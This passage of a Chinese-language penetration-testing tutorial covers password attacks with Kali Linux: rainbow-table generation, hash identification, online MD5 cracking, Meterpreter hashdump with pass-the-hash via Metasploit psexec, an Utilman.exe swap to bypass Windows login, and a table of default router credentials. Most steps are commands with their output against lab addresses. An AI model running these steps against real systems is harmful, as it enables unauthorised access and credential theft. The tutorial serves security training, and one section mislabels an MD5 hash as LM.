class="line">rp</span><br><span class="line">rootroot</span><br><span class="line">toor</span><br><span class="line">Root</span><br><span class="line">ROOT</span><br><span class="line">rooted</span><br><span class="line">rooting</span><br><span class="line">pwroot</span><br><span class="line">rootpw</span><br><span class="line">pwdroot</span><br><span class="line">rootpwd</span><br><span class="line">adminroot</span><br><span class="line">rootadmin</span><br><span class="line">sysroot</span><br><span class="line">rootsys</span><br><span class="line">r007</span><br><span class="line">…//省略部分内容//…</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到生成的密码字典。由于篇幅所限，只列出了部分密码。</p></li></ol><h4 id="1-3-3-使用rtgen工具"><a href="#1-3-3-使用rtgen工具" class="headerlink" title="1.3.3 使用rtgen工具"></a>1.3.3 使用rtgen工具</h4><p>rtgen工具用来生成彩虹表。彩虹表是一个庞大的针对各种可能的字母组合和预先计算好的哈希值的集合。其中，生成的彩虹表包括多种算法，如LM、NTLM、MD5、SHA1和SHA256。然后，使用该彩虹表可以快速地破解各类密码。</p><p>语法格式如下：</p><blockquote><p>rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index</p></blockquote><p>或者：</p><blockquote><p>rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench</p></blockquote><p>以上语法中的参数含义如下：</p><blockquote><p>hash_algorithm：指定使用的哈希算法。其中，可指定的值包括lm、ntlm、md5、sha1和sha256。<br>charset：指定字符集。</p></blockquote><p>其中，rtgen工具默认提供的字符集文件为<code>/usr/share/rainbowcrack/charset.txt</code>，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /usr/share/rainbowcrack/charset.txt</span></span><br><span class="line"></span><br><span class="line">numeric            = [0123456789]</span><br><span class="line"></span><br><span class="line">alpha              = [ABCDEFGHIJKLMNOPQRSTUVWXYZ]</span><br><span class="line">alpha-numeric      = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]</span><br><span class="line"></span><br><span class="line">loweralpha         = [abcdefghijklmnopqrstuvwxyz]</span><br><span class="line">loweralpha-numeric = [abcdefghijklmnopqrstuvwxyz0123456789]</span><br><span class="line"></span><br><span class="line">mixalpha           = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ]</span><br><span class="line">mixalpha-numeric   = [abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]</span><br><span class="line"></span><br><span class="line">ascii-32-95                  = [ !<span class="string">"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~]</span></span><br><span class="line"><span class="string">ascii-32-65-123-4            = [ !"</span><span class="comment">#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`&#123;|&#125;~]</span></span><br><span class="line">alpha-numeric-symbol32-space = [ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@<span class="comment">#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;"'&lt;&gt;,.?/ ]</span></span><br></pre></td></tr></table></figure><p>以上输出信息显示rtgen工具默认提供的所有字符集。</p><blockquote><p>plaintext_len_min：指定生成的密码最小长度；<br>plaintext_len_max：指定生成的密码最大长度；<br>table_index：指定表单数量；<br>chain_len：指定链长度；<br>chain_num：指定链个数；<br>part_index：指定块数量。</p></blockquote><p>使用rtgen工具生成一个基于MD5的彩虹表。其中，指定密码的最小长度为4，最大长度为8。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rtgen md5 loweralpha 4 8 0 1000 1000 0</span></span><br><span class="line">rainbow table md5_loweralpha<span class="comment">#4-8_0_1000x1000_0.rt parameters</span></span><br><span class="line"><span class="built_in">hash</span> algorithm:         md5</span><br><span class="line"><span class="built_in">hash</span> length:            16</span><br><span class="line">charset name:           loweralpha</span><br><span class="line">charset data:           abcdefghijklmnopqrstuvwxyz</span><br><span class="line">charset data <span class="keyword">in</span> hex:    61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a</span><br><span class="line">charset length:         26</span><br><span class="line">plaintext length range: 4 - 8</span><br><span class="line">reduce offset:          0x00000000</span><br><span class="line">plaintext total:        217180128880</span><br><span class="line"></span><br><span class="line">sequential starting point begin from 0 (0x0000000000000000)</span><br><span class="line">generating...</span><br><span class="line">1000 of 1000 rainbow chains generated (0 m 0.1 s)</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功生成了一个基于MD5的彩虹表，文件名为<code>md5_loweralpha#4-8_0_1000x1000_0.rt</code>。其中，该彩虹表默认保存在<code>/usr/share/rainbowcrack</code>目录中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /usr/share/rainbowcrack</span></span><br><span class="line"></span><br><span class="line">┌──(root💀docker-ptf)-[/usr/share/rainbowcrack]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">alglib0.so   md5_loweralpha<span class="comment">#4-8_0_1000x1000_0.rt  readme.txt  rtc2rt  rtmerge</span></span><br><span class="line">charset.txt  rcrack                               rt2rtc      rtgen   rtsort</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，生成的彩虹表文件为md5_loweralpha#4-8_0_1000x1000_0.rt。为了更方便使用生成的彩虹表，可以使用rtsort命令对其进行排序。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rtsort md5_loweralpha\#4-8_0_1000x1000_0.rt</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将不会输出任何信息。接下来，就可以使用该彩虹表实施密码破解了。</p><h2 id="二、破解哈希密码"><a href="#二、破解哈希密码" class="headerlink" title="二、破解哈希密码"></a>二、破解哈希密码</h2><p>为了避免信息泄漏造成的危害，在实际应用中，软件和系统会将密码进行加密，然后进行保存。常见的加密方式是各种哈希算法。这类算法可以将不同长度的密码加密成固定长度的字符串。由于加密后的字符串位定长，并且不能被直接逆向破解，所以安全度非常高，也因此被广泛应用。</p><h3 id="2-1-识别哈希加密方式"><a href="#2-1-识别哈希加密方式" class="headerlink" title="2.1 识别哈希加密方式"></a>2.1 识别哈希加密方式</h3><p>哈希加密是一类算法，包含很多种具体的算法。渗透测试者在破解一个哈希密码时，如果确定该哈希密码的加密方式，就可以选择针对性的工具和方式实施破解了，可以节约大量的时间，从而提高破解效率。下面介绍使用hashid工具识别哈希加密方式的方法。</p><h4 id="2-1-1-hashid工具"><a href="#2-1-1-hashid工具" class="headerlink" title="2.1.1 hashid工具"></a>2.1.1 hashid工具</h4><p>识别哈希密码值<code>6bcec2ba2597f089189735afeaa300d4</code>的加密方式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashid 6bcec2ba2597f089189735afeaa300d4</span></span><br><span class="line">Analyzing <span class="string">'6bcec2ba2597f089189735afeaa300d4'</span></span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5</span><br><span class="line">[+] MD4</span><br><span class="line">[+] Double MD5</span><br><span class="line">[+] LM</span><br><span class="line">[+] RIPEMD-128</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Skein-256(128)</span><br><span class="line">[+] Skein-512(128)</span><br><span class="line">[+] Lotus Notes/Domino 5</span><br><span class="line">[+] Skype</span><br><span class="line">[+] Snefru-128</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] Domain Cached Credentials</span><br><span class="line">[+] Domain Cached Credentials 2</span><br><span class="line">[+] DNSSEC(NSEC3)</span><br><span class="line">[+] RAdmin v2.x</span><br></pre></td></tr></table></figure><p>以上输出信息显示了可能使用的哈希密码方式。其中，显示在前面的哈希类型方式可能性更大。由此可以猜测出，该密码的哈希类型为MD2或MD5。</p><h4 id="2-1-1-hash-identifier工具"><a href="#2-1-1-hash-identifier工具" class="headerlink" title="2.1.1 hash-identifier工具"></a>2.1.1 hash-identifier工具</h4><p>识别哈希密码值<code>6bcec2ba2597f089189735afeaa300d4</code>的加密方式。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hhhash-identifier</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">   <span class="comment">#     __  __                     __           ______    _____           #</span></span><br><span class="line">   <span class="comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span></span><br><span class="line">   <span class="comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span></span><br><span class="line">   <span class="comment">#     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span><br><span class="line">   <span class="comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span></span><br><span class="line">   <span class="comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span></span><br><span class="line">   <span class="comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span></span><br><span class="line">   <span class="comment">#                                                             By Zion3R #</span></span><br><span class="line">   <span class="comment">#                                                    www.Blackploit.com #</span></span><br><span class="line">   <span class="comment">#                                                   Root@Blackploit.com #</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: e10adc3949ba59abbe56e057f20f883e</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4((<span class="variable">$pass</span>)).(strtolower(<span class="variable">$username</span>)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$username</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.LF.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$username</span>.<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(md5(md5(md5(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(md5(md5(md5(md5(<span class="variable">$pass</span>)))))</span><br><span class="line">[+] md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(sha1(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(sha1(md5(sha1(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH:</span><br></pre></td></tr></table></figure><p>以上输出信息显示该密码的哈希类型为MD5。</p><h3 id="2-2-破解LM-Hashes密码"><a href="#2-2-破解LM-Hashes密码" class="headerlink" title="2.2 破解LM Hashes密码"></a>2.2 破解LM Hashes密码</h3><p>LM（LAN Manager）Hash是Windows操作系统最早使用的密码哈希算法之一。下面将介绍使用findmyhash工具破解LM Hashes密码的方法。</p><p>使用findmyhash工具破解密码的语法格式如下：</p><blockquote><p>findmyhash<algorithm>OPTIONS</algorithm></p></blockquote><p>以上语法中，参数algorithm表示指定破解的密码算法类型，支持的算法有MD4、MD5、SHA1、SHA224、SHA256、SHA384、SHA512、RMD160、GOST、WHIRLPOOL、LM、NTLM、MYSQL、CISCO7、JUNIPER、LDAP_MD5和LDAp_SHA1。OPTIONS表示可用的选项。其中，常用的选项及含义如下：</p><blockquote><p>-h<hash_value>：指定破解的哈希值。<br>-f<file>：指定破解的哈希文件列表。<br>-g：如果不能破解哈希密码，将使用Google搜索并显示结果。其中，该选项只能和-h选项一起使用。</file></hash_value></p></blockquote><p>使用findmyhash工具破解LM哈希密码<code>5f4dcc3b5aa765d61d8327deb882cf99</code>的原始密码。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># findmyhash MD5 -h 5f4dcc3b5aa765d61d8327deb882cf99</span></span><br><span class="line">Cracking <span class="built_in">hash</span>: 5f4dcc3b5aa765d61d8327deb882cf99</span><br><span class="line">Analyzing with md5hood (http://md5hood.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> md5hood</span><br><span class="line">Analyzing with stringfunction (http://www.stringfunction.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> stringfunction</span><br><span class="line">Analyzing with 99k.org (http://xanadrel.99k.org)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> 99k.org</span><br><span class="line">Analyzing with sans (http://isc.sans.edu)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> sans</span><br><span class="line">Analyzing with bokehman (http://bokehman.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> bokehman</span><br><span class="line">Analyzing with goog.li (http://goog.li)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> goog.li</span><br><span class="line">…//省略部分内容//…</span><br><span class="line">Analyzing with rednoize (http://md5.rednoize.com)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> rednoize</span><br><span class="line">Analyzing with md5-db (http://md5-db.de)...</span><br><span class="line">... <span class="built_in">hash</span> not found <span class="keyword">in</span> md5-db</span><br><span class="line">Analyzing with my-addr (http://md5.my-addr.com)...</span><br><span class="line">***** HASH CRACKED!! *****</span><br><span class="line">The original string is: password</span><br><span class="line">The following hashes were cracked:                                                                <span class="comment">#破解成功</span></span><br><span class="line">----------------------------------</span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99 -&gt; password</span><br></pre></td></tr></table></figure><p>从以上输出信息可以看到，成功破解了LM哈希密码<code>5f4dcc3b5aa765d61d8327deb882cf99</code>的原始密码，原始密码为password。</p><h3 id="2-3-直接使用哈希密码值"><a href="#2-3-直接使用哈希密码值" class="headerlink" title="2.3 直接使用哈希密码值"></a>2.3 直接使用哈希密码值</h3><p>当用户无法破解哈希密码时，利用特定的漏洞可以直接使用哈希密码，而无须破解。在Metasploit框架中，可以通过使用<code>exploit/windows/smb/psexec</code>渗透测试模块，来直接使用哈希密码，绕过密码验证。</p><p>通过使用<code>exploit/windows/smb/psexec</code>渗透测试模块，来直接利用哈希密码。具体操作步骤如下：</p><ol><li><p>在Meterpreter会话中使用hashdump命令获取哈希密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></li><li><p>后台运行Meterpreter会话，并切换到模块配置界面。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br></pre></td></tr></table></figure></li><li><p>选择exploit/windows/smb/psexec模块，并查看模块配置选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options </span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line">   Name        Current Setting        Required        Description</span><br><span class="line">   ----        ---------------        --------        -----------</span><br><span class="line">   RHOSTS                             yes        The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                   yes        The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                no        Service description to to be used on target <span class="keyword">for</span> pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME               no        The service display name</span><br><span class="line">   SERVICE_NAME                       no        The service name</span><br><span class="line">   SHARE        ADMIN$                yes        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal <span class="built_in">read</span>/write folder share</span><br><span class="line">   SMBDomain        .                 no        The Windows domain to use <span class="keyword">for</span> authentication</span><br><span class="line">   SMBPass                            no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">   SMBUser                            no        The username to authenticate as</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure></li><li><p>配置选项参数。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> RHOSTS 192.168.197.129   <span class="comment">#设置远程主机地址</span></span><br><span class="line">RHOSTS =&gt; 192.168.197.129</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBUser administrator    <span class="comment">#设置SMB用户</span></span><br><span class="line">SMBUser =&gt; administrator</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBUser Administrator</span><br><span class="line">SMBUser =&gt; Administrator</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; <span class="built_in">set</span> SMBPass aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6  <span class="comment">#设置SMB密码</span></span><br><span class="line">SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:b3255351d8dfe7cdedf3f552a49146d6</span><br></pre></td></tr></table></figure></li><li><p>实施渗透，直接使用哈希密码值。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.197.128:4444 </span><br><span class="line">[*] 192.168.197.129:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.197.129:445 - Authenticating to 192.168.197.129:445 as user <span class="string">'Administrator'</span>...</span><br><span class="line">[*] 192.168.197.129:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.197.129:445 - Executing the payload...</span><br><span class="line">[+] 192.168.197.129:445 - Service start timed out, OK <span class="keyword">if</span> running a <span class="built_in">command</span> or non-service executable...</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.197.129</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.197.128:4444 -&gt; 192.168.197.129:49170) at 2021-01-05 12:45:48 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，使用bob用户成功地打开了一个会话。</p></li></ol><h2 id="三、借助Utilman绕过Windows登录"><a href="#三、借助Utilman绕过Windows登录" class="headerlink" title="三、借助Utilman绕过Windows登录"></a>三、借助Utilman绕过Windows登录</h2><p>Utilman是Windows辅助工具管理器。在Windows下，即使没有进行用户登录，也可以使用Windows+U组合键调用Utilman进程。借助该机制，可以绕过Windows登录验证机制，对系统进行操作。</p><p>通过将Utilman.exe文件替换成cmd.exe，绕过登录进行操作。具体操作步骤如下：</p><ol><li><p>在Windows系统的计算机上，使用U盘安装介质的方式进入Kali Linux的Live模式。首先启动U盘安装介质，将显示系统安装引导界面，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%873.png" alt="图片3"></p></li><li><p>在该界面选择Live(amd64)，即可进入Live模式。然后，在该Live模式中打开Windows文件系统。如图下图所示，在该界面依次选择Places|Computer选项。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%874.png" alt="图片4"></p></li><li><p>在该界面单击Computer选项后，将打开本地计算机文件系统，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%875.png" alt="图片5"></p></li><li><p>该界面显示了Linux Live系统的文件列表。此时，在左侧栏中选择Other Locations命令，即可看到其他硬盘文件，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%876.png" alt="图片6"></p></li><li><p>该界面显示了该计算机中的所有磁盘分区。根据显示的分区大小，找到Windows系统的分区。在本例中，Windows系统的分区为322GB Volume。所以，打开该硬盘分区，将显示Windows系统的文件列表，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%877.png" alt="图片7"></p></li><li><p>在该界面依次进入Windows|System32文件夹，将显示如下图所示的内容。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%878.png" alt="图片8"></p></li><li><p>在该文件夹中找到Utilman.exe文件，将该文件重命名为Utilman.old。然后复制该目录下的cmd.exe文件作为副本，并将其文件名修改为Utilman.exe。接下来，关闭Kali Linux Live模式，并启动Windows系统。在登录界面按Wins+U组合键，将显示如下图所示的界面。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%879.png" alt="图片9"></p></li><li><p>从该界面可以看到，打开了一个命令提示符窗口。在该窗口中，可以执行各种终端命令。例如，使用whoami命令查看用户信息，如下图所示。</p><p><img src="/2021/01/05/kali-mi-ma-gong-ji/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p></li><li><p>从输出的信息可以看到，当前用户拥有最高的权限。此时，可以进行任何的操作。</p></li></ol><h2 id="四、路由器密码破解"><a href="#四、路由器密码破解" class="headerlink" title="四、路由器密码破解"></a>四、路由器密码破解</h2><p>路由器是一个网络的核心设备。一旦控制路由器，就很容易对连接该路由器的主机实施各种数据嗅探和欺骗攻击。大部分路由器都是使用用户名/密码的身份验证方式。而每个路由器的管理界面都有初始用户名和密码。由于一些管理员用户的失误，可能会使用初始密码或者弱密码。</p><h3 id="4-1-路由器初始密码"><a href="#4-1-路由器初始密码" class="headerlink" title="4.1 路由器初始密码"></a>4.1 路由器初始密码</h3><p>大部分路由器都有初始用户名和密码。为了方便用户实施路由器密码破解，下面列出常见的路由器初始用户名和密码，如下表所示。</p><table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>admin</td><td>admin</td></tr><tr><td>root</td><td>root</td></tr><tr><td>user</td><td>user</td></tr><tr><td>user</td><td>password</td></tr><tr><td>adsl</td><td>adsl1234</td></tr><tr><td>admin</td><td>password</td></tr><tr><td>admin</td><td>conexant</td></tr><tr><td>password</td><td>password</td></tr><tr><td>admin</td><td>123456</td></tr><tr><td>admin</td><td>utstar</td></tr><tr><td>admin</td><td>private</td></tr><tr><td>admin</td><td>epicrouter</td></tr><tr><td>SZIM</td><td>SZIM</td></tr></tbody></table><h3 id="4-2-使用Medusa工具"><a href="#4-2-使用Medusa工具" class="headerlink" title="4.2 使用Medusa工具"></a>4.2 